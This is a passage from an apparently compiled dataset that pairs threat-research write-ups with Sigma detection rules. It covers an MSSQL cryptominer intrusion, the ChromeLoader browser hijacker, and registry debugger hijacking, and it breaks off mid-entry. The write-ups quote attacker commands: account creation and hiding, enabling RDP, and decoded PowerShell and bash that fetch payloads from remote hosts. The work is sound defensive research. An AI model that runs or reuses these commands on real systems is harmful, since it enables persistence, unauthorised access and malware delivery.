Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Base64 MZ Header In CommandLine",
      "id": "22e58743-4ac8-4a9f-bf19-00a0428d8c5f",
      "status": "test",
      "description": "Detects encoded base64 MZ header in the commandline",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "TVqQAAMAAAAEAAAA",
            "TVpQAAIAAAAEAA8A",
            "TVqAAAEAAAAEABAA",
            "TVoAAAAAAAAAAAAA",
            "TVpTAQEAAAAEAAAA"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_inline_base64_mz_header.yml"
  },
  "33": {
    "url": "https://redcanary.com/blog/chromeloader/",
    "markdown": "# ChromeLoader: a pushy malvertiser\n\n**ChromeLoader might seem like a run-of-the-mill browser hijacker, but its peculiar use of PowerShell could spell deeper trouble.**\n\n**Originally published:** May 25, 2022. Last modified April 30, 2024.\n\n---\n\n*Editor’s note: We’ve been researching this threat since early February. In recent days, we’ve observed what appears to be a resurgence in ChromeLoader activity. As a result, this research is based on analysis of threats spanning almost five months. That said, the detection guidance in this report provides defense-in-depth against ChromeLoader and a wide array of other threats.*\n\nChromeLoader is a pervasive and persistent browser hijacker that modifies its victims’ browser settings and redirects user traffic to advertisement websites. This malware is introduced via an ISO file that baits users into executing it by posing as a cracked video game or pirated movie or TV show. It eventually manifests as a browser extension.\n\nLike most suspicious browser extensions, ChromeLoader is a relatively benign threat that hijacks user search queries and redirects traffic to an advertising site. However, ChromeLoader uses PowerShell to inject itself into the browser and add a malicious extension to it, a technique we don’t see very often (and one that often goes undetected by other security tools). If applied to a higher-impact threat—such as a credential harvester or spyware—this PowerShell behavior could help malware gain an initial foothold and go undetected before performing more overtly malicious activity, like exfiltrating data from a user’s browser sessions.\n\nWe first encountered this threat after detecting encoded PowerShell commands referencing a scheduled task called “ChromeLoader”—and only later learned that we were catching ChromeLoader in the middle stage of its deployment.\n\n## A note on existing research\n\nIn the process of writing this blog, we found two related articles that warrant a mention—and that are definitely worth reading:\n\n**Choziosi Loader:**\nThe folks at G-Data wrote a great article on a threat they call “Choziosi Loader” that validates a lot of our own ChromeLoader findings.\n\n**The macOS variant:**\nOnce we knew about G-Data’s Choziosi naming convention, we discovered another excellent write-up by Colin Cowie analyzing a macOS variant of ChromeLoader.\n\nIn this article, we share important elements of the ChromeLoader infection chain and security guidance that you can apply to detect and hunt for ChromeLoader activity in your environment. While some of the information in this blog overlaps with existing research published by G-Data and Colin Cowie, we’re sharing new insights and guidance that security teams can use to develop behavioral analytics to detect ChromeLoader.\n\n## Initial access\n\nChromeLoader is delivered by an ISO file, typically masquerading as a torrent or cracked video game. It appears to spread through pay-per-install sites and social media platforms such as Twitter.\n\n*Figure 1: Redacted screenshot of a Twitter post with scannable QR code leading to ChromeLoader’s initial download site*\n\nOnce downloaded and executed, the .ISO file is extracted and mounted as a drive on the victim’s machine. Within this ISO is an executable used to install ChromeLoader, along with what appears to be a .NET wrapper for the Windows Task Scheduler. This is how ChromeLoader maintains its persistence on the victim’s machine later in the intrusion chain.\n\n```image\nAlt: ChromeLoader files dropped\nDescription: The image is a screenshot from a VirusTotal analysis displaying the file system actions related to the ChromeLoader malware. It lists the files dropped by the malicious ISO, including an executable file named 'CS_installer.exe' and several DLL files associated with the Windows Task Scheduler in multiple languages. The structure indicates the path where each file is located, suggesting the malware's method of installation and persistence on the victim's machine.\nTranscription: |\n  File System Actions\n  \n  Files Dropped\n  + /Volumes/CDROM/CS_installer.exe\n  + /Volumes/CDROM/de/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/es/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/fr/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/it/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/Microsoft.Win32.TaskScheduler.dll\n  + /Volumes/CDROM/pl/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/ru/Microsoft.Win32.TaskScheduler.resources.dll\n  + /Volumes/CDROM/zh-CN/Microsoft.Win32.TaskScheduler.resources.dll\n```\n\n*Figure 2: VirusTotal analysis on files dropped by malicious ISO*\n\n## Execution and persistence\n\nExecuting `CS_Installer.exe` creates persistence through a scheduled task using the Service Host Process (`svchost.exe`). Notably, ChromeLoader does not call the Windows Task Scheduler (`schtasks.exe`) to add this scheduled task, as one might expect. Instead, we saw the installer executable load the Task Scheduler COM API, along with a cross-process injection into `svchost.exe` (which is used to launch ChromeLoader’s scheduled task).\n\n```image\nAlt: CS_Installer.exe\nDescription: The image displays a log table detailing various events related to process execution. It includes columns for 'TIME', 'TYPE', and 'EVENT'. The timestamps show actions occurring on January 6, 2022, at 11:10:36 PM and 11:10:37 PM, with entries indicating cross-process actions ('crossproc') and module loads ('modload'). The events specify the processes involved, including `svchost.exe` and various DLL files from the `syswow64` directory, along with unique identifiers for the processes.\nTranscription: |\n  | TIME                    | TYPE      | EVENT                                                                                                                                                         |\n  | ----------------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | 11:10:36 pm Jan 6, 2022 | crossproc | This process opened a handle with change rights to process c:\\windows\\system32\\svchost.exe (643ec58e82e0272c97c2a59f6020970d881af19c0ad5029db9c958c13b6558c7) |\n  | 11:10:36 pm Jan 6, 2022 | crossproc | This process opened a handle with change rights to process c:\\windows\\system32\\svchost.exe (643ec58e82e0272c97c2a59f6020970d881af19c0ad5029db9c958c13b6558c7) |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\taskschd.dll] (945ed444c593216754d034b044173b431a785d7e7164313eb075089ba030b59)                                                  |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\sspicli.dll] (828ea379d5dbac54a26d57d79107bdace62631da36d4ab9818aca375da0b25)                                                    |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\windows.storage.dll] (5204ce5ffe9d9b997890493a9fa10739b986b1285692bd2437de3f205d05)                                              |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\wldp.dll] (f65f6ee84c67e34fdcb6342645ec3095b2b37c96c1a30a08afea53c089d712)                                                       |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\profapi.dll] (7b86fa00478776a4facdad452f88d7f0b36f76d36d8ddcc32c76d)                                                             |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\xmllite.dll] (e137d4deee8a83482578cf118c73ba90718eafb04dde40c2c8db28d4d2)                                                        |\n  | 11:10:37 pm Jan 6, 2022 | modload   | Loaded: [c:\\windows\\syswow64\\sxs.dll] (27ae4c9e9d580f8247c743699ba58f506b4b6c87084d1daae0e47706)                                                              |\n```\n\n*Figure 3: Carbon Black console crossprocs and modloads of `CS_Installer.exe`*\n\nFigure 3 depicts the cross-process injection into `svchost.exe`. Cross-process injection is frequently used by legitimate applications but may be suspicious if the originating process is located on a virtual drive (like those that you’d expect an ISO file to mount on). It’s a good idea to keep an eye out for processes executing from file paths that don’t reference the default `C:\\drive` and that initiate a cross-process handle into a process that is on the C:\\drive. This will not only offer visibility into ChromeLoader activity, but also into the many worms that originate from removable drives and inject into `C:\\drive` processes, like `explorer.exe`, to propagate on a victim’s machine.\n\nAfter the cross-process injection is complete, ChromeLoader’s scheduled task will execute through svchost, calling the Command Interpreter (`cmd.exe`), which executes a Base64-encoded PowerShell command containing multiple declared variables. ChromeLoader uses the shortened `-encodedcommand` flag to encode its PowerShell command:\n\n```image\nAlt: Encoded PowerShell content\nDescription: The image displays a detailed output from the Windows PowerShell console, showing a command that was executed as part of a cyber threat incident involving ChromeLoader. The upper section lists the command line used to spawn a PowerShell process, which includes parameters for execution policy and window style. Below that, it presents a long Base64-encoded string, which represents the malicious PowerShell command issued by ChromeLoader. The decoding section provides the decoded command, revealing its actions: it checks for the presence of a Chrome extension, downloads a file from a remote server, and manipulates scheduled tasks and file paths associated with the ChromeLoader operation. The text highlights the PowerShell's functions and actions, indicating its use in carrying out malicious activities.\nTranscription: |\n  Threat occurred\n  Process spawned\n  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  04029e121acf591794937d22a219d4d4fddf5d3b48f66ccd9f\n  \n  Command Line: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E\n  JABkAGQAbgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0AGEAQgB0...\n```\n\n*Figure 4: Encoded PowerShell content spawned by ChromeLoader’s scheduled task*\n\nOnce decoded and beautified, the command looks like this:\n\n```image\nAlt: PowerShell CLI decode\nDescription: The image depicts a segment of PowerShell script related to ChromeLoader. The script checks for the installation of a Chrome extension, and if not found, it downloads an archive from a specified domain using 'wget'. It subsequently extracts the contents and manages the extension's installation and versioning. The code includes condition checks for file paths, variable assignments, and error handling, illustrating the automated process of managing Chrome extensions potentially for malicious purposes.\nTranscription: |\n  $extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n  $confPath = \"$extPath\\conf.js\"\n  $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n  $taskName = \"ChromeLoader\"\n  $domain = \"brokenka.work\"\n  \n  $isOpen = 0\n  $dd = 0\n  $ver = 0\n  \n  (Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\") | Select-Object CommandLine | ForEach-Object {\n      if ($_ -Match \"load-extension\") {\n          break\n      }\n  }\n  \n  $isOpen = 1\n  \n  if ($isOpen) {\n      if (-not(Test-Path -Path \"$extPath\")) {\n          try {\n              wget \"https://$domain/archive.zip\" -outfile \"$archiveName\"\n          } catch {\n              break\n          }\n          Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n          Remove-Item path \"$archiveName\" -Force\n      } else {\n          try {\n              if (Test-Path -Path \"$confPath\") {\n                  $conf = Get-Content -Path $confPath\n                  $conf.Split(\";\") | ForEach-Object {\n                      if ($_ -Match \"dd\") {\n                          $dd = $_.Split('\\'')[1]\n                      } elseif ($_ -Match \"ExtensionVersion\") {\n                          $ver = $_.Split('\\'')[1]\n                      }\n                  }\n              }\n          } catch {}\n      }\n  }\n  \n  if ($dd -and $ver) {\n      try {\n          $un = wget \"https://$domain/un?did=$dd&ver=$ver\"\n          if ($un -Match \"$dd\") {\n              Unregister-ScheduledTask -TaskName \"$taskName\" -Confirm:$false\n              Remove-Item path \"$extPath\" -Force -Recurse\n          }\n      } catch {}\n      try {\n          wget \"https://$domain/archive.zip?did=$dd&ver=$ver\" -outfile \"$archiveName\"\n      } catch {}\n  }\n```\n\n*Figure 5: PowerShell CLI decoded and beautified by reddit user “Russianh4ck3r”*\n\nIn this command, PowerShell checks if the ChromeLoader extension is installed. If the specific file path is not found, it will pull down an archive file from a remote location using `wget` and load the contents as a Chrome extension. Once the extension is found, this PowerShell command will silently remove the ChromeLoader scheduled task using the `Unregister-ScheduledTask` function.\n\nChromeLoader then loads its extension into Chrome by using PowerShell to spawn Chrome with the `--load-extension` flag and references the file path of the downloaded extension.\n\n```image\nAlt: PowerShell spawning Chrome\nDescription: The image shows a terminal output detailing a process spawned by PowerShell. It includes the file path of the Chrome application and the command line used to launch it with specific flags. The command line indicates that Chrome is being started with a load-extension flag that points to a user-specific directory, suggesting the execution of a potentially malicious Chrome extension.\nTranscription: |\n  Process spawned by powershell.exe\n  C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\n  acfb588d8780ee19c192515d376ce7f9b2b0f936487008d373f9730425e657b\n  \n  Command Line: \"chrome.exe\" --load-extension=C:\\Users\\[REDACTED]\\AppData\\Local\\chrome --restore-last-session --noerrdialogs --disable-session-crashed-bubble\n```\n\n*Figure 6: PowerShell spawning Chrome*\n\nOnce loaded in Chrome, the malicious extension can execute its true objective: redirecting victim search results through malvertising domains and redirecting away from the Chrome extensions page if the user attempts to remove the extension.\n\n## macOS Variation\n\nIn late April, Colin Cowie published an analysis of the macOS version of ChromeLoader, which is capable of loading malicious extensions into both the Chrome and Safari web browsers. After reading Colin’s blog, we retroactively analyzed some Red Canary threat detections that seemed to constitute partial execution of this variation from a published detection in late February. As illustrated below, ChromeLoader redirects an encoded command from a Bourne shell (`sh`) into a Bourne-again SHell (`bash`). The command itself searches for `Google Chrome` process using grep, then loads the malicious extension from `/private/var/tmp/` if the process is found.\n\n```image\nAlt: Decoded Bash command\nDescription: The image displays a decoded Bash command related to the macOS variation of ChromeLoader malware. It shows a command line executed in a shell that attempts to find the Google Chrome process and, if found, loads a malicious browser extension from a specified directory. The command includes a base64 decoding operation and outlines the logic for running the extension, including checking for existing instances of Chrome and managing their execution.\nTranscription: |\n  Threat occurred\n  \n  Process spawned by xpccproxy\n  /bin/sh  ca935ef0ed93fea251f912ff284 9aaa0071eed4787ea3664a569f480f9a40b3b8daba93b26f95\n  \n  Command Line: sh -c \"echo aWgYcGmYXggfCBcmVwIClZIdGdyZXAgfCBcmVwIIdCdH29nbGUgQ2hyb21jZQ==ZJQ0U9J0dvb2dZSBDaHJvbWUgL1Sb2FLkW4dGvc2lvbicTgIMHzBfIhgZJ3ZLcCAtd1BcmVnIWhgZJ3ZLcAnR29zZ2x1ENocm9tZStALwXWQtZh0ZW5zW5aW9u9yAmPiAvZGV2L251bGw7IHRoZW4gZWNobyBdW5u5N0yAgRVhRURUST9OX1NFUAtY5AnR29zZ2x1ENocm9tZScgSlhcmdzIClERhLnNpb249JYcZXRlL3Zhcig90bAXrkFEjY1MEMtYTYs00NDA4LUJFOUt0jIwNTJGOUIzNzWYaJtLXJLC3RvcmltQbFzdC1ZXN2aw9UIC0tbmJkaWFSb2dzIct0ZgQncvVubmLuZzgZmke | base64 --decode | bash\"\n  \n  Decoded:\n  if ps ax | grep -v grep | grep 'Google Chrome' >& /dev/null; then echo running; EXTENSION_SERVICE='Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' >& /dev/null; then echo e running; else pkill -a -i 'Google Chrome'; sleep 1; open -a 'Google Chrome' --args --load-extension='/private/var/tmp/[REDACTED]' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi; else echo not running; fi\n  \n  This command loads Google Chrome and reopens with the extension /private/var/tmp/[REDACTED] loaded.\n```\n\n*Figure 7: Decoded Bash command loading malicious extension into Chrome*\n\nThe macOS variation has the same initial access technique as the Windows variant, namely that it uses baited social media posts with QR codes or links that direct users to malicious pay-per-install download sites. Instead of originating as an ISO, the macOS variation originates in an Apple Disk Image (`DMG`) file format. And unlike the Windows variation, the DMG file contains an installer script that drops payloads for either Chrome or Safari, not a portable executable file. When executed by the end user, the installer script then initiates cURL to retrieve a ZIP file containing the malicious browser extension and unzips it within the `/private/var/tmp` directory, finally executing Chrome with command-line options to load the malicious extension.\n\n```image\nAlt: Bash script decompressing browser extension\nDescription: The image displays a Bash script that is designed to download and decompress a malicious Chrome extension. It includes commands to check for the existence of the extension, retrieve a ZIP file from a specified server using cURL, and unzips the contents to a designated directory. The script also manages terminal visibility and runs in the context of the user's session.\nTranscription: |\n  #!/bin/bash\n  osascript -e 'tell application \"Terminal\" to set visible of front window to false'\n  BPATH=\"/private/var/tmp\"\n  IPATH=$(uuidgen)\n  \n  EXISTS=`launchctl list | grep \"chrome.extension\"`\n  SUB=chrome.extension\n  if [[ \"$EXISTS\" == *\"$SUB\"* ]]; then\n      exit 0\n  fi\n  \n  status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https://example_c2_server.com/archive.zip )\n  if [[ \"$status_code\" == 200 ]] ; then\n      curl -s https://example_c2_server.com/archive.zip > $BPATH/$IPATH.zip /dev/null\n  else\n      exit 0\n  fi\n  \n  sleep 1\n  XPATH=$(uuidgen)\n  unzip -o $BPATH/$IPATH.zip -d $BPATH/$XPATH &>/dev/null\n  cd $BPATH/$XPATH\n```\n\n*Figure 8: Bash script downloading and decompressing the ChromeLoader browser extension. Image courtesy of Colin Cowie.*\n\nTo maintain persistence, the macOS variation of ChromeLoader will append a preference (`plist`) file to the `/Library/LaunchAgents` directory. This ensures that every time a user logs into a graphical session, ChromeLoader’s Bash script can continually run. Once installed, ChromeLoader performs the same activity as it does on Windows machines: redirecting web traffic through advertising sites.\n\n## Detection\n\n### **Detection opportunity 1**: PowerShell containing a shortened version of the `encodedCommand` flag in its command line\n\nThis pseudo detection logic looks for the execution of encoded PowerShell commands. Not all encoded PowerShell is malicious, but encoded commands are worth keeping an eye on.\n\n```\nprocess_name == powershell.exe\n&&\ncommand_line_includes (-e, -en, -enc, [going on sequentially until the full flag, -encodedcommand])\n```\n\n*Note: Many applications will legitimately encode PowerShell and make use of these shortened flags. Some tuning may be required, depending on your environment. To refine this detection analytic, consider looking for multiple variables in the decoded PowerShell block paired with the use of a shortened `encodedCommand` flag stated above. Variables are declared in PowerShell using `$`.*\n\n```\ndecoded_command_line_includes == $\n```\n\n### **Detection opportunity 2**: PowerShell spawning `chrome.exe` containing `load-extension` and `AppData\\Local` within the command line\n\nThe detection analytic looks for instances of the Chrome browser executable spawning from PowerShell with a corresponding command line that includes `appdata\\local` as a parameter.\n\n```\nparent_process_name == powershell.exe\n&&\nprocess_name == chrome.exe\n&&\ncommand_line_includes (AppData\\Local, load-extension)\n```\n\n### **Detection opportunity 3**: Shell process spawning process loading a Chrome extension within the command line\n\nThis analytic looks for `sh` or `bash` scripts running in macOS environments with command lines associated with the macOS variant of ChromeLoader.\n\n```\nparent_process_equals_any (sh || bash)\n&&\nprocess_name_is_osx?\n&&\ncommand_line_includes (/tmp/ || load-extension || chrome)\n```\n\n### **Detection opportunity 4**: Redirected Base64 encoded commands into a shell process\n\nLike the encoded PowerShell detection analytics idea above, this detector looks for the execution of encoded `sh`, `bash`, or `zsh` commands on macOS endpoints.\n\n```\ncommand_line_includes (echo, base64)\n&&\nchildproc_equals_any (sh,bash,zsh)\n```\n\n*Note: As is the case with PowerShell, there are many legitimate uses for encoding shell commands. Some tuning may be required, depending on your environment.*\n\n## Conclusion\n\nWe hope this blog helps you improve your defense-in-depth against ChromeLoader specifically—but also for any variety of other threats that leverage suspicious ISO/DMG files and PowerShell/Bash execution. As always, each environment is different and certain administrative or user workflows may trigger your new detection analytics. Please be sure to tune accordingly. Happy hunting!",
    "sigma_rule": {
      "title": "Suspicious Chromium Browser Instance Executed With Custom Extension",
      "id": "27ba3207-dd30-4812-abbf-5d20c57d474e",
      "related": [
        {
          "id": "88d6e60c-759d-4ac1-a447-c0f1466c2d21",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a suspicious process spawning a Chromium based browser process with the 'load-extension' flag to start an instance with a custom extension",
      "references": [
        "https://redcanary.com/blog/chromeloader/",
        "https://emkc.org/s/RJjuLa",
        "https://www.mandiant.com/resources/blog/lnk-between-browsers"
      ],
      "author": "Aedan Russell, frack113, X__Junior (Nextron Systems)",
      "date": "2022-06-19",
      "modified": "2023-11-28",
      "tags": [
        "attack.persistence",
        "attack.t1176"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\wscript.exe"
          ],
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe"
          ],
          "CommandLine|contains": "--load-extension="
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_browsers_chromium_susp_load_extension.yml"
  },
  "34": {
    "url": "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/",
    "markdown": "# Beyond good ol’ Run key, Part 4\n\nPosted on 2013-09-19\n\nLast three articles about various startup/autostart methods covered a lot of different well- and less-known techniques for ‘staying alive’. Many of them are actively used by malware and ‘normal’ software; some are just ideas that are worth describing because… luck favors a prepared mind. If you haven’t read them previously, you can do so by visiting these links: Part 1, Part 2, Part 3.\n\nIn today’s post I will cover some more techniques including hijacking of various debuggers and some more obscure ways of ‘survival’. I think this is probably the lamest part of the series so far, because the techniques are old-school and amateurish, but luckily it is not the last one, so stay tuned for Part 5 🙂\n\n## Hijacking debuggers\n\nThe list of debuggers one can replace on the system is as follows:\n\n- Standalone Debugger (32- and 64- bit)\n\n  ```\n  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug]\n  Debugger = PATH\n\n  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug]\n  Debugger = PATH\n  ```\n\n- .NET Debugger (32- and 64- bit)\n\n  ```\n  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework]\n  DbgManagedDebugger = PATH\n\n  [HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\.NETFramework]\n  DbgManagedDebugger = PATH\n  ```\n\n- Script Debugger\n\n  ```\n  